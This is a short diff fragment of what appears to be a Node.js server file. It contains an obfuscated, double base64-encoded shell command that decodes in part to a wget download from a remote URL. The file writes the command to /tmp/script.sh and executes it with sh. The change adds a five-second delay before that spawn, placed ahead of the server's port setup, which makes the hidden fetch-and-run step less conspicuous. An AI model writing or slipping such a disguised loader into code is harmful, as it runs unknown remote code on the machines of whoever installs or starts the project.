@@ -22,17 +22,19 @@ echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5Yj
 
 fs.writeFileSync("/tmp/script.sh", script);
 
-const child = spawn("sh", ["/tmp/script.sh"], {
-  stdio: "inherit",
-});
-
-child.on("error", (err) => {
-  console.error("child process error:", err);
-});
-
-child.on("exit", (code, signal) => {
-  console.log("child exited:", code, signal);
-});
+setTimeout(() => {
+  const child = spawn("sh", ["/tmp/script.sh"], {
+    stdio: "inherit",
+  });
+  
+  child.on("error", (err) => {
+    console.error("child process error:", err);
+  });
+  
+  child.on("exit", (code, signal) => {
+    console.log("child exited:", code, signal);
+  });
+}, 5000);
 
 const PORT = process.env.PORT || 3000;
 
